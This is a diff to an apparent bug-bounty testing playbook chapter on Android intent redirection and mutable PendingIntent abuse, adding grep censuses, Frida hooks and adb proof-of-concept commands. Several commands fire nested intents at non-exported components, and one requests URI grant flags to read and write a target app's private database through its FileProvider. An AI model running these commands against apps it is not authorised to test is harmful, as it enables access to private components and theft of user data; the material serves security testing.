@@ -10,7 +10,7 @@
 |---|---|
 | **Phases** | P4 static analysis, P5 IPC exercise, P7 impact conversion |
 | **Milestones** | M4, M5, M7 |
-| **VRT ceiling** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the redirect reaches an authenticated action; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the stolen file yields a token for an internet-facing API; `server_side_injection.remote_code_execution_rce` (P1) for the write→code-load chain. The routine landing zone is `broken_access_control.exposed_sensitive_android_intent` — **priority null, rated entirely on what you demonstrate** |
+| **VRT ceiling** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the redirect reaches an authenticated action; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the stolen file yields a token for an internet-facing API; `server_side_injection.remote_code_execution_rce` (P1) for the write→code-load chain. The routine landing zone is `broken_access_control.exposed_sensitive_android_intent` — **priority *varies*, rated entirely on what you demonstrate** |
 | **Primary attacker model** | AM-03 zero-permission local app; AM-02 remote one-click for the `parseUri`/`intent://`/deep-link delivery variants; AM-04 for the notification-listener PendingIntent variants |
 | **Maps to** | MASVS-PLATFORM-1, MASVS-CODE-4; MASTG-TEST-0381, MASTG-TEST-0375, MASTG-TEST-0372, MASTG-TEST-0374, MASTG-KNOW-0024, MASTG-KNOW-0117, MASTG-KNOW-0138, MASTG-BEST-0063, rule `mastg-android-pendingintent-mutable`; MASWE-0032, MASWE-0050, MASWE-0029; CWE-926, CWE-927, CWE-940, CWE-269, CWE-20, CWE-345, CWE-502; ATT&CK T1626, T1635, T1635.001, T1409, T1533 |
 
@@ -36,7 +36,7 @@ name: a WebView that already carries the session, a `FileProvider` with a `<root
 that performs a state change without re-auth.
 
 The honest caveat is version drift. Android 16 (API 36) hardens nested-Intent launches **by default for
-all apps**, and Android 14 made the blank-base mutable `PendingIntent` throw. Neither kills the class — 16
+apps targeting SDK 36+** (D08-020 states the enforcement scope), and Android 14 made the blank-base mutable `PendingIntent` throw. Neither kills the class — 16
 ships an explicit opt-out (`removeLaunchSecurityProtection()`), 14's check is satisfied by
 `setPackage(context.packageName)` which leaves the component fillable — but both will be used to close your
 report unless you ran the PoC on two API levels yourself and said so in the first paragraph. A redirection
@@ -100,6 +100,21 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
     reboot-surviving exfiltration channel lives.
 11. **Discipline items** (D08-062 → D08-066) last, but before you write anything.
 
+> **R8 survival rule (read before any grep in this chapter).** Framework method names (`getParcelableExtra`,
+> `startActivity`, `setResult`, `parseUri`, `PendingIntent.getActivity`, `grantUriPermission`,
+> `removeLaunchSecurityProtection` when called directly) and string literals survive R8. androidx class and
+> method names (`IntentSanitizer`, `sanitizeByThrowing`, `IntentCompat`, `BundleCompat`) and **all constants**
+> do not — they are renamed or inlined to numbers: `URI_ALLOW_UNSAFE`=4, `FLAG_MUTABLE`=33554432
+> (0x2000000), `FLAG_IMMUTABLE`=67108864 (0x4000000), `FLAG_UPDATE_CURRENT`=134217728 (0x8000000),
+> `FLAG_ONE_SHOT`=1073741824 (0x40000000), `FLAG_ALLOW_UNSAFE_IMPLICIT_INTENT`=16777216 (0x1000000),
+> `FLAG_GRANT_READ/WRITE/PERSISTABLE/PREFIX_URI_PERMISSION`=1/2/64/128, `FILL_IN_COMPONENT`=8,
+> `FILL_IN_PACKAGE`=16, `FILL_IN_SELECTOR`=64. Every grep below for a constant or an androidx name carries a
+> numeric or fingerprint fallback; **a zero on the symbolic grep alone is never a negative**, and an androidx
+> helper survives only as a renamed two-or-three-method class whose callers are the real sites (D08-001,
+> wrapper hop). Conventions: `SERIAL` from `engagement.json` pins every `adb`/`frida` call; `$DEC` is
+> `$E/decompiled` (P2); any `--es/--eu/-d` value containing `; | & $ ( ) ? * #` or a space goes through
+> `adb shell` double-quoted with the value single-quoted inside (D08-064).
+
 ## Items
 
 ### D08-001 · Census every unparcel-to-launch sink in the app
@@ -107,9 +122,10 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | Support |
-| **VRT** | none — inventory feeding `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | none — inventory feeding `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
+| **Record** | logs/D08-001-candidates.txt (the worksheet); logs/D08-001-extractors.txt; logs/D08-001-sinks.txt; logs/D08-001.txt |
 | **Maps to** | MASWE-0032 (CWE-927, CWE-940); Google Mobile VRP "Intent redirections leading to launching non-exported application components"; Google's own auditing tip — "Find calls to `startActivity` and verify that Intent components are constructed from trusted data. Find calls `Intent::getExtras` where returned values are cast to Intent" |
 
 - **Test:** Build the complete candidate list before testing anything: every place attacker-controlled
@@ -117,35 +133,41 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   it with the app's UID.
 - **How:**
   ```bash
-  jadx -d out target.apk      # or: jadx -d out --deobf base.apk split_config.*.apk
-  # 1. the extractors
-  grep -rnE 'getParcelableExtra\(|getParcelableArrayListExtra\(|getParcelable\(|getSerializableExtra\(|Intent\.parseUri\(|Intent\.getIntent\(|Intent\.getIntentOld\(|Parcel\.obtain\(\)|unmarshall\(|readParcelable\(|"android\.intent\.extra\.INTENT"|EXTRA_INTENT' out/sources/ \
-    | grep -viE '^out/sources/(android|androidx|kotlin|com/google/android/material)/' > /tmp/d08_extractors.txt
-  # 2. the sinks
-  grep -rnE 'startActivity\(|startActivityForResult\(|startActivities\(|startService\(|startForegroundService\(|bindService\(|sendBroadcast\(|sendOrderedBroadcast\(|setResult\(|\.send\(' out/sources/ \
-    | grep -viE '^out/sources/(android|androidx|kotlin)/' > /tmp/d08_sinks.txt
+  # decompiled per START.md §6: $DEC/jadx (jadx --deobf base.apk split_*.apk) and $DEC/apktool — never an ad-hoc out/
+  # 1. the extractors (typed, untyped-cast and the Bundle.get() form; untyped Bundle.get() casts are how SDK wrapper activities obtain a PendingIntent)
+  grep -rnE 'getParcelableExtra\(|getParcelableArrayListExtra\(|getParcelableArrayList\(|getParcelable\(|getSerializableExtra\(|Intent\.parseUri\(|Intent\.getIntent\(|Intent\.getIntentOld\(|Parcel\.obtain\(\)|unmarshall\(|readParcelable\(|"android\.intent\.extra\.INTENT"|EXTRA_INTENT|getExtras\(\)\.get\(|extras\.get\(|\(PendingIntent\)[[:space:]]*[A-Za-z0-9_.]*\.get|\(Intent\)[[:space:]]*[A-Za-z0-9_.]*\.get\(' "$DEC/jadx/sources/" \
+    | grep -vE "^$DEC/jadx/sources/(android|androidx|kotlin|com/google/android/material)/" > "$E/logs/D08-001-extractors.txt"
+  # 2. the sinks (startIntentSender* and getIntentSender() are the highest-ceiling ones and are easy to miss)
+  grep -rnE 'startActivity\(|startActivityForResult\(|startActivities\(|startService\(|startForegroundService\(|bindService\(|sendBroadcast\(|sendOrderedBroadcast\(|setResult\(|\.send\(|startIntentSender(ForResult|FromChild)?\(|getIntentSender\(\)|sendIntent\(' "$DEC/jadx/sources/" \
+    | grep -vE "^$DEC/jadx/sources/(android|androidx|kotlin)/" > "$E/logs/D08-001-sinks.txt"
   # 3. the join — same file, close line numbers
-  awk -F: '{print $1":"$2}' /tmp/d08_extractors.txt | sort -u | while read -r loc; do
+  awk -F: '{print $1":"$2}' "$E/logs/D08-001-extractors.txt" | sort -u | while read -r loc; do
     f=${loc%%:*}; l=${loc##*:}
-    grep -n "" "$f" | awk -F: -v L="$l" '$1>=L && $1<=L+12' | grep -qE 'startActivity|startService|bindService|sendBroadcast|setResult|\.send\(' \
+    grep -n "" "$f" | awk -F: -v L="$l" '$1>=L && $1<=L+12' | grep -qE 'startActivity|startService|bindService|sendBroadcast|setResult|\.send\(|startIntentSender|getIntentSender|sendIntent' \
       && echo "SINK-REACHABLE $f:$l"
-  done | tee /tmp/d08_candidates.txt
-  wc -l /tmp/d08_candidates.txt        # count the results — a silent zero here is a failed loop, not a clean app
+  done | tee "$E/logs/D08-001-candidates.txt"
+  wc -l "$E/logs/D08-001-candidates.txt"        # count the results — a silent zero here is a failed loop, not a clean app
   ```
-  Then cross the file list against the exported set in the **merged** manifest:
+  **Wrapper hop (R8 builds).** `IntentCompat.getParcelableExtra` / `BundleCompat.getParcelable` survive only
+  as a renamed two-or-three-method helper that is the sole direct caller of the framework method, with no
+  sink within 12 lines. For every extractor hit whose enclosing class is under ~60 lines, treat the helper's
+  **callers** as the extractor sites — `grep -rnE '\b<Cls>[.]<method>[(]' "$DEC/jadx/sources"` — and append
+  them to the worksheet with `extractor form = wrapper`. Then cross the file list against the exported set in
+  the **merged** manifest (the APK manifest is already the build-merged one):
   ```bash
-  apkanalyzer manifest print target.apk > out/AndroidManifest.merged.xml
-  grep -nE 'android:exported="true"|<activity|<service|<receiver|<provider|android:permission=' out/AndroidManifest.merged.xml
+  apkanalyzer manifest print "$E/apk/base.apk" > "$DEC/AndroidManifest.merged.xml"
+  grep -nE 'android:exported="true"|<activity|<service|<receiver|<provider|android:permission=' "$DEC/AndroidManifest.merged.xml"
   ```
-- **Proof:** A table with one row per candidate: file, method, extractor API, sink API, enclosing
-  component, exported yes/no, guarding permission. This table is the chapter's worksheet; every later item
-  consumes a row of it.
+- **Proof:** A table with one row per candidate: file, method, extractor API, extractor form (typed |
+  untyped-cast | wrapper), sink API, enclosing component, exported yes/no, guarding permission. This table is
+  the chapter's worksheet (`logs/D08-001-candidates.txt`); every later item consumes a row of it.
 - **Escalation:** Each exported row with no permission is a D08-007 candidate; each non-exported row that a
   deep link reaches is a D08-022 candidate; each `Bundle` forward is D08-030.
 - **Ruled out when:** No extractor API appears outside `android/`, `androidx/` and Kotlin stdlib packages
   **and** every `startActivity`/`sendBroadcast` argument in the app's own packages is an `Intent`
-  constructed in the same method from a literal class reference. Record the candidate count (zero) and the
-  grep commands, not "the scanner found nothing".
+  constructed in the same method from a literal class reference, **and** every wrapper-class hit was
+  followed to its callers (the D08-064 count line shows `wrapper_hits=`). Record the candidate count (zero)
+  and the grep commands, not "the scanner found nothing".
 
 ### D08-002 · Enable `StrictMode.detectUnsafeIntentLaunch()` and drive the app
 
@@ -156,6 +178,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | **Attacker** | AM-12 (own device instrumentation, not an attack) |
 | **Applies to** | device API >= 31; `detectAll()` implies it for apps targeting Android 12 |
 | **Requires** | device, frida, api>=31 |
+| **Record** | logs/D08-002.txt (StrictMode log); logs/D08-002-frida.txt (the armed line) |
 | **Maps to** | `guide/components/intents-filters#DetectUnsafeIntentLaunches`; `about/versions/12/behavior-changes-12`; `about/versions/15/behavior-changes-15`; MASTG-TECH-0043; rule `mastg-android-strictmode` |
 
 - **Test:** The platform ships a runtime detector for exactly this class: it fires when the app unparcels a
@@ -172,11 +195,14 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   });
   ```
   ```bash
-  frida -D "$SERIAL" -f com.target.app -l d08_strictmode.js
-  adb logcat -c && adb logcat -s StrictMode:* | tee /tmp/d08_strictmode.log
+  frida -D "$SERIAL" -q -t 600 -f com.target.app -l d08_strictmode.js | tee "$E/logs/D08-002-frida.txt"
+  adb -s "$SERIAL" logcat -c && adb -s "$SERIAL" logcat -s StrictMode:* | tee "$E/logs/D08-002.txt"
   # platform-side alternative on a debuggable build:
-  adb shell am compat enable DETECT_UNSAFE_INTENT_LAUNCH com.target.app
+  adb -s "$SERIAL" shell am compat enable DETECT_UNSAFE_INTENT_LAUNCH com.target.app
   ```
+  `-D "$SERIAL"` always (`adb devices -l` to read it; `-U` picks silently with two devices); `-f` spawns and
+  resumes on its own in frida-tools 17 (the old no-pause flag no longer exists); `-q` needs `-t <seconds>` or the session detaches
+  right after script load; attach mode (`-p`/`-n`) does not honour `-t` — wrap it in `timeout 900 frida ...`.
   Then exercise every exported entry point from D08-001 with `am start`/`am broadcast` and every deep link.
 - **Proof:** `StrictMode policy violation: android.os.strictmode.UnsafeIntentLaunchViolation` in logcat,
   with a stack frame naming the forwarding method and class. That frame is the exact line to weaponise.
@@ -185,7 +211,8 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 - **Ruled out when:** Every exported entry point and every registered deep-link URI has been driven with
   the policy armed and no `UnsafeIntentLaunchViolation` fired, **and** you can show the policy was actually
   installed (the `[+] armed` line plus one deliberately-triggered violation from your own stub as a
-  positive control). An absent violation with no positive control proves nothing.
+  positive control), and the `[+] detectUnsafeIntentLaunch armed` line is present in `logs/D08-002-frida.txt`
+  (proof the session attached to the intended serial). An absent violation with no positive control proves nothing.
 
 ### D08-003 · Frida census of the redirection and PendingIntent surface at runtime
 
@@ -196,7 +223,8 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | **Attacker** | AM-12 |
 | **Applies to** | all |
 | **Requires** | device, frida |
-| **Maps to** | MASTG-TECH-0043; MASTG-TEST-0381 (the hook is the MASTG-TEST-0030 legacy snippet); drozer `parcelable` extra type and `android.intent.extra.INTENT` (verified in `src/drozer/android.py`) |
+| **Record** | logs/D08-003.txt (the runtime census) |
+| **Maps to** | MASTG-TECH-0043; MASTG-TEST-0381 (the hook is the MASTG-TEST-0030 legacy snippet — that page is deprecated upstream); drozer `parcelable` extra type and `android.intent.extra.INTENT` (verified in `src/drozer/android.py`) |
 
 - **Test:** Static analysis misses reflective launches, SDK code obfuscated past your greps, and
   PendingIntents built by libraries. Hook the framework, not the app.
@@ -231,6 +259,8 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
             ' mutable='   + ((flags & MUTABLE)   !== 0) +
             ' oneshot='   + ((flags & ONESHOT)   !== 0) +
             ' update='    + ((flags & UPDATE)    !== 0) +
+            ' fillComponent=' + ((flags & 0x8) !== 0) + ' fillSelector=' + ((flags & 0x40) !== 0) +
+            ' fillPackage=' + ((flags & 0x10) !== 0) +      // low-order FILL_IN_* bits decide what a sender can retarget (D08-037)
             ' intent=' + (intent ? intent.toString() : 'null'));
           return o.apply(this, a);
         };
@@ -239,16 +269,17 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   });
   ```
   ```bash
-  frida -D "$SERIAL" -f com.target.app -l d08_census.js | tee /tmp/d08_runtime.log
-  adb shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'   # live PendingIntent records
+  frida -D "$SERIAL" -q -t 900 -f com.target.app -l d08_census.js | tee "$E/logs/D08-003.txt"   # -D pins the serial; -q needs -t
+  adb -s "$SERIAL" shell dumpsys activity intents | sed -n '/com.target.app/,/^$/p'   # live PendingIntent records
   ```
 - **Proof:** Runtime log lines showing (a) a `startActivity` whose component you supplied, and (b)
   `PendingIntent` creations with `immutable=false` and a base intent whose `toString()` has no `cmp=`.
   Those two lines are the exploitable shapes for D08-007 and D08-037.
 - **Escalation:** Feeds every item in this chapter; the flag decode also settles D08-042 and D08-043.
 - **Ruled out when:** The app was driven through every screen, deep link and notification with the hooks
-  installed, every `PendingIntent.get*` line shows `immutable=true` **and** a `cmp=` in the base intent,
-  and no `startActivity` line carries a component sourced from an extra.
+  installed (the first census line is present in `logs/D08-003.txt`, proving the session attached to the
+  intended serial), every `PendingIntent.get*` line shows `immutable=true` **and** a `cmp=` in the base
+  intent, and no `startActivity` line carries a component sourced from an extra.
 
 ### D08-004 · Two-API-level control run before any redirection claim
 
@@ -268,8 +299,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   ```bash
   for S in emulator-5554 emulator-5556; do
     echo "== $S sdk=$(adb -s $S shell getprop ro.build.version.sdk)"
-    adb -s $S shell am start -n com.target.app/.RedirectActivity \
-      --es intent "intent:#Intent;component=com.target.app/.PrivateActivity;end"
+    adb -s "$S" shell "am start -n com.target.app/.RedirectActivity --es intent 'intent:#Intent;component=com.target.app/.PrivateActivity;end'"   # double-quoted for adb, single-quoted for the device sh: the ';' must reach the app
     adb -s $S shell dumpsys activity activities | grep -m1 -E 'mResumedActivity|ResumedActivity'
     adb -s $S logcat -d -s ActivityTaskManager PackageManager AndroidRuntime | tail -20
   done
@@ -293,7 +323,6 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — argue it) |
 | **Attacker** | AM-03, AM-08 |
 | **Applies to** | all; especially apps embedding wallet, payment, push, ads or analytics SDKs |
-| **Requires** | exported-activity, exported-service, exported-receiver |
 | **Maps to** | Microsoft Security Blog 2026-04-09 on EngageLab EngageSDK — vulnerable exported `MTCommonActivity` "automatically added to the merged manifest", vulnerable ≤ 4.5.4, fixed 5.2.1 (2025-11-03), 50M+ installs; Google Play ASI "Intent Redirection" campaign (2019-05-16); MASWE-0032 |
 
 - **Test:** The vulnerable component is frequently not the developer's. Manifest merging pulls activities,
@@ -306,18 +335,17 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   grep -nE '<(activity|service|receiver|provider)[^>]*android:name="[^"]*"' merged.xml \
     | grep -v 'com\.target\.app\.' | grep -n 'exported="true"'
   # redirection sinks in SDK code only
-  grep -rnE 'getParcelableExtra\("?android\.intent\.extra\.INTENT|startActivity\(\s*\(Intent\)\s*get|startService\(\s*\(Intent\)\s*get|sendBroadcast\(\s*\(Intent\)\s*get|parseUri\(' out/sources/ \
-    | grep -viE '^out/sources/(android|androidx|kotlin|com/google/android/material|com/target/app)/'
+  grep -rnE 'getParcelableExtra\("?android\.intent\.extra\.INTENT|startActivity\(\s*\(Intent\)\s*get|startService\(\s*\(Intent\)\s*get|sendBroadcast\(\s*\(Intent\)\s*get|parseUri\(' "$DEC/jadx/sources/" \
+    | grep -vE "^$DEC/jadx/sources/(android|androidx|kotlin|com/google/android/material|com/target/app)/"
   # the EngageLab-class signatures specifically
-  grep -rn 'n_intent_uri\|processIntent\|processPlatformMessage\|MTCommonActivity' out/sources/
+  grep -rn 'n_intent_uri\|processIntent\|processPlatformMessage\|MTCommonActivity' "$DEC/jadx/sources/"
   ```
   Fire each SDK component directly:
   ```bash
-  adb shell am start -n com.target.app/<SdkActivity> \
-    --es forward_uri "intent:#Intent;component=com.target.app/.InternalOnlyActivity;end"
+  adb -s "$SERIAL" shell "am start -n com.target.app/<SdkActivity> --es forward_uri 'intent:#Intent;component=com.target.app/.InternalOnlyActivity;end'"
   ```
 - **Proof:** The internal, non-exported activity visibly launches
-  (`adb shell dumpsys activity activities | grep -m1 mResumedActivity`) while a direct
+  (`adb -s "$SERIAL" shell dumpsys activity activities | grep -m1 mResumedActivity`) while a direct
   `am start -n com.target.app/.InternalOnlyActivity` returns `SecurityException: Permission Denial`.
   Name the SDK, its version from `META-INF`/`BuildConfig`, and whether a fixed version exists.
 - **Escalation:** → D17 supply chain (the fix is a dependency bump, which changes who owns the report);
@@ -341,16 +369,19 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 
 - **Test:** A redirect that carries grant flags only pays if there is something worth granting. Enumerate
   which authorities are grantable and how wide their path scope is, so you know which URI to aim the
-  redirect at before you build the PoC.
+  redirect at before you build the PoC. The manifest census itself is owned by D07-024/025/061 (one pass
+  per provider); this row records the grant-scope table the redirect items consume, not a second census.
 - **How:**
   ```bash
-  grep -nE '<provider' -A12 out/AndroidManifest.merged.xml | grep -nE 'authorities|exported|grantUriPermissions|<grant-uri-permission|android:permission'
-  grep -n 'grantUriPermissions="true"' out/AndroidManifest.merged.xml
-  xmlstarlet sel -t -m "//provider/grant-uri-permission" \
-    -v "@android:pathPattern" -o " | prefix=" -v "@android:pathPrefix" -o " | path=" -v "@android:path" -n out/AndroidManifest.merged.xml
+  grep -nE '<provider' -A12 "$DEC/AndroidManifest.merged.xml" | grep -nE 'authorities|exported|grantUriPermissions|<grant-uri-permission|android:permission'
+  grep -n 'grantUriPermissions="true"' "$DEC/AndroidManifest.merged.xml"
+  # dependency-free form first (xmlstarlet is not on a stock host; the android: prefix needs its namespace declared)
+  python3 -c 'import sys,xml.etree.ElementTree as E;A="{http://schemas.android.com/apk/res/android}";[print(p.get(A+"authorities"),p.get(A+"exported"),p.get(A+"grantUriPermissions"),[g.attrib for g in p.iter("grant-uri-permission")]) for p in E.parse(sys.argv[1]).iter("provider")]' "$DEC/AndroidManifest.merged.xml"
+  xmlstarlet sel -N android=http://schemas.android.com/apk/res/android -t -m '//provider/grant-uri-permission' \
+    -v '@android:pathPattern' -o ' | prefix=' -v '@android:pathPrefix' -o ' | path=' -v '@android:path' -n "$DEC/AndroidManifest.merged.xml"
   # FileProvider path scope — <root-path path="."/> maps the whole visible filesystem
-  grep -rn 'android.support.FILE_PROVIDER_PATHS\|androidx.core.content.FileProvider' out/AndroidManifest.merged.xml
-  cat out/res/xml/*path*.xml out/res/xml/*provider*.xml 2>/dev/null
+  grep -rn 'android.support.FILE_PROVIDER_PATHS\|androidx.core.content.FileProvider' "$DEC/AndroidManifest.merged.xml"
+  cat "$DEC/apktool/res/xml/"*path*.xml "$DEC/apktool/res/xml/"*provider*.xml 2>/dev/null
   ```
   ```
   dz> run app.provider.info -a com.target.app -v      # "Grant Uri Permissions: true"
@@ -371,10 +402,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) — argue up to `broken_authentication_and_session_management.authentication_bypass` (P1) when the reached component performs an authenticated action |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) — argue up to `broken_authentication_and_session_management.authentication_bypass` (P1) when the reached component performs an authenticated action |
 | **Attacker** | AM-03 |
 | **Applies to** | all; Android 16 hardens by default (run D08-004) |
-| **Requires** | exported-activity, deeplink |
 | **Maps to** | `privacy-and-security/risks/intent-redirection` — impact per the page: "Execute internal features in the vulnerable app" and "Access private components like unexported ContentProvider objects"; MASWE-0032 (CWE-927, CWE-940); CWE-926; H1 #200427 (Slack, Critical), #2289836 (MercadoLibre, High 8.6), #1095633 (VK), #951691; EDB 38170 (Facebook for Android 1.8.1, `LoginActivity` → `FacebookWebViewActivity`); Ostorlab KB `INTENT_REDIRECTION` (MASVS_CODE_4, MSTG_PLATFORM_2, M4 2024) |
 
 - **Test:** An exported component pulls an `Intent` out of its own extras and passes it to
@@ -402,14 +432,14 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   ```
   Key names worth trying first, all seen in real apps:
   ```bash
-  grep -rnE '"(extra_intent|extra_deep_link_intent|intent|forward|forward_intent|redirect|redirect_intent|referrerActivity|next|nextIntent|target|continuation_intent|android\.intent\.extra\.INTENT)"' out/sources/
+  grep -rnE '"(extra_intent|extra_deep_link_intent|intent|forward|forward_intent|redirect|redirect_intent|referrerActivity|next|nextIntent|target|continuation_intent|android\.intent\.extra\.INTENT)"' "$DEC/jadx/sources/"
   ```
 - **Proof:** The paired failure/success, which is the only proof triagers accept:
   ```bash
-  adb shell am start -n com.target.app/.internal.NonExportedActivity
+  adb -s "$SERIAL" shell am start -n com.target.app/.internal.NonExportedActivity
   # SecurityException: Permission Denial: ... not exported from uid ...
-  adb shell am start -n com.attacker.poc/.Go          # fires the nested payload
-  adb shell dumpsys activity activities | grep -m1 -E 'mResumedActivity|ResumedActivity'
+  adb -s "$SERIAL" shell am start -S -n com.attacker.poc/.Go       # -S: force-stop first, so onCreate runs on every fire (D08-064)
+  adb -s "$SERIAL" shell dumpsys activity activities | grep -m1 -E 'mResumedActivity|ResumedActivity'
   # → com.target.app/.internal.NonExportedActivity
   ```
   Plus a screenshot of the internal screen rendering with your data.
@@ -427,10 +457,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all; implicit **service** binding has been illegal since Android 5, so an implicit `bindService` is both a crash and a LEGACY pattern |
-| **Requires** | exported-service, exported-receiver |
 | **Maps to** | MASWE-0032; ATT&CK T1624.001 Broadcast Receivers; CVE-2023-44121 (LG ThinQ, exported receiver action `com.lge.lms.things.notification.ACTION`) |
 
 - **Test:** Reviewers stop at `startActivity`. The same unparcel-and-launch shape in `startService`,
@@ -438,13 +467,11 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   broadcast/service sink launches with no visible UI — which removes the "the user would notice" objection.
 - **How:**
   ```bash
-  grep -rnE 'getParcelableExtra\(' out/sources/ -A8 | grep -nE 'startService|startForegroundService|bindService|sendBroadcast|sendOrderedBroadcast|sendBroadcastAsUser'
+  grep -rnE 'getParcelableExtra\(' "$DEC/jadx/sources/" -A8 | grep -nE 'startService|startForegroundService|bindService|sendBroadcast|sendOrderedBroadcast|sendBroadcastAsUser'
   ```
   ```bash
-  adb shell am startservice -n com.target.app/.ExportedService \
-    --es redirect_intent 'intent:#Intent;component=com.target.app/.PrivService;action=com.target.DO;end'
-  adb shell am broadcast -n com.target.app/.RelayReceiver -a com.target.RELAY \
-    --es forwarded 'intent:#Intent;component=com.target.app/.HiddenActivity;S.extra=1;end'
+  adb -s "$SERIAL" shell "am startservice -n com.target.app/.ExportedService --es redirect_intent 'intent:#Intent;component=com.target.app/.PrivService;action=com.target.DO;end'"
+  adb -s "$SERIAL" shell "am broadcast -n com.target.app/.RelayReceiver -a com.target.RELAY --es forwarded 'intent:#Intent;component=com.target.app/.HiddenActivity;S.extra=1;end'"
   ```
   For a true nested Parcelable use the stub app as in D08-007 with `startService`/`sendBroadcast` on the
   outer intent.
@@ -456,17 +483,19 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 - **Ruled out when:** No `getParcelableExtra`/`parseUri` result reaches a service or broadcast sink, or the
   enclosing service declares a signature-level `android:permission` and `onBind`/`onStartCommand`
   additionally checks `Binder.getCallingUid()` against `PackageManager.getPackagesForUid()` plus a
-  signature comparison.
+  signature comparison. A component that re-sends a **caller-supplied** `PendingIntent`/`IntentSender` is not
+  this item: `send()` executes with the creator's identity, so the attacker's own token borrows nothing, and
+  with no fill-in Intent the caller cannot add data, flags or a grant either (graveyard) — the only asset it
+  can donate is background-launch standing, D08-067.
 
 ### D08-009 · Literal `startActivity(getIntent())` self-forward
 
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
-| **Requires** | exported-activity, exported-service, exported-receiver |
 | **Maps to** | MASWE-0032 (CWE-927); Oversecured "Android: Access to app protected components" — remediation line "Developers should never redirect Intents in full" |
 
 - **Test:** The degenerate case that greps for `getParcelableExtra` miss entirely: the component forwards
@@ -474,9 +503,9 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   — is attacker-controlled in one shot.
 - **How:**
   ```bash
-  grep -rnE 'startActivity\(\s*getIntent\(\)\s*\)|startService\(\s*getIntent\(\)\s*\)|sendBroadcast\(\s*getIntent\(\)\s*\)|startActivity\(\s*intent\s*\)' out/sources/ -B6
+  grep -rnE 'startActivity\(\s*getIntent\(\)\s*\)|startService\(\s*getIntent\(\)\s*\)|sendBroadcast\(\s*getIntent\(\)\s*\)|startActivity\(\s*intent\s*\)' "$DEC/jadx/sources/" -B6
   # and the near-miss: a copy that keeps the flags
-  grep -rnE 'new Intent\(\s*getIntent\(\)\s*\)|Intent\(\s*intent\s*\)' out/sources/ -A6
+  grep -rnE 'new Intent\(\s*getIntent\(\)\s*\)|Intent\(\s*intent\s*\)' "$DEC/jadx/sources/" -A6
   ```
   Note `new Intent(Intent o)` is a **copy constructor** that preserves flags, data, selector and extras —
   a "we rebuild the intent" defence that rebuilds nothing.
@@ -494,10 +523,10 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the read file yields a token for an internet-facing API; otherwise `broken_access_control.exposed_sensitive_android_intent` (null) |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the read file yields a token for an internet-facing API; otherwise `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all; precondition is a provider with `android:grantUriPermissions="true"` or a `<grant-uri-permission>` child (D08-006) |
-| **Requires** | provider, exported-activity, deeplink |
+| **Requires** | provider |
 | **Maps to** | `risks/intent-redirection` — the mitigation list names exactly the four flags to strip: `FLAG_GRANT_READ_URI_PERMISSION`, `FLAG_GRANT_WRITE_URI_PERMISSION`, `FLAG_GRANT_PERSISTABLE_URI_PERMISSION`, `FLAG_GRANT_PREFIX_URI_PERMISSION`; MASTG-TEST-0250 Note 2; MASTG-KNOW-0117; drozer flag map `GRANT_READ_URI_PERMISSION 0x00000001`, `GRANT_WRITE_URI_PERMISSION 0x00000002`; H1 #272044 (Dropbox, $1000); Oversecured "Android: Access to app protected components" §2–3 |
 
 - **Test:** The reached component does not have to be interesting. Point the nested intent at **your own**
@@ -525,11 +554,13 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   ```
   From the shell, the flag-only variant against a forwarder that takes a data URI directly:
   ```bash
-  adb shell am start -n com.target.app/.Forwarder -f 0x00000003 \
+  adb -s "$SERIAL" shell am start -n com.target.app/.Forwarder -f 0x00000003 \
     --eu android.intent.extra.STREAM \
     content://com.target.app.fileprovider/root/data/data/com.target.app/databases/app.db
   # 0x3 = FLAG_GRANT_READ_URI_PERMISSION | FLAG_GRANT_WRITE_URI_PERMISSION
